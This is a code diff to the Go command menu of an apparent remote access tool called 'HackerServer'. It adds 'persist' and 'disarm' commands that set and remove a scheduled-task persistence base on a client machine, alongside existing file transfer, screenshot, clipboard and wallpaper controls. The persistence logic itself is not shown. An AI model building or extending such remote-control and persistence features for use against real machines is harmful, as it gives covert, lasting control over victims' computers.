@@ -10,6 +10,7 @@ import (
 	"HackerServer/core/device"
 	"HackerServer/core/download"
 	"HackerServer/core/handleConnection"
+	"HackerServer/core/persist"
 	"HackerServer/core/wall"
 	"bufio"
 	"os"
@@ -26,13 +27,16 @@ func options() {
 	fmt.Println("[+] navigate  \t:\tFile System Navigation")
 	fmt.Println("[+] upload  \t:\tUpload a file to Client")
 	fmt.Println("[+] download  \t:\tDownload a file from Client")
-	fmt.Println("[+] clear \t:\tClear terminal screen")
+	fmt.Println("[+] persist  \t:\tadd a persistance schedule task")
+	fmt.Println("[+] disarm  \t:\tremoves the persistance")
 	fmt.Println("[+] snap \t:\tSaves screen in Appdata/Roaming")
 	fmt.Println("[+] alert \t:\tPops up an Alert Dialog box")
 	fmt.Println("[+] clipboard \t:\tread or write to\\from Client clipboard")
-	fmt.Println("[+] appdata \t:\tcd to appdata of user")
-	fmt.Println("[+] device_info \t:\tDisplays Client info")
 	fmt.Println("[+] make_noise \t:\tplays audio file from host till told to")
+	fmt.Println("[+] wallpaper \t:\tSet wallpaper from url")
+	fmt.Println("[+] device_info \t:\tDisplays Client info")
+	fmt.Println("[+] appdata \t:\tcd to appdata of user")
+	fmt.Println("[+] clear \t:\tClear terminal screen")
 	fmt.Println("[+] exit \t:\tExit the Server\n")
 	fmt.Println("=======================================================")
 }
@@ -116,6 +120,16 @@ func main() {
 		case user_input == "make_noise":
 			fmt.Println("[+] Trying to make some noise...")
 			err = audio.Play(connection)
+			DisplayError(err)
+
+		case user_input == "persist":
+			fmt.Println("[+] Make base under appdata")
+			err = persist.Schedule(connection)
+			DisplayError(err)
+
+		case user_input == "disarm":
+			fmt.Println("[+] removing persistance")
+			err = persist.Remove(connection)
 			DisplayError(err)
 
 		case user_input == "device_info":
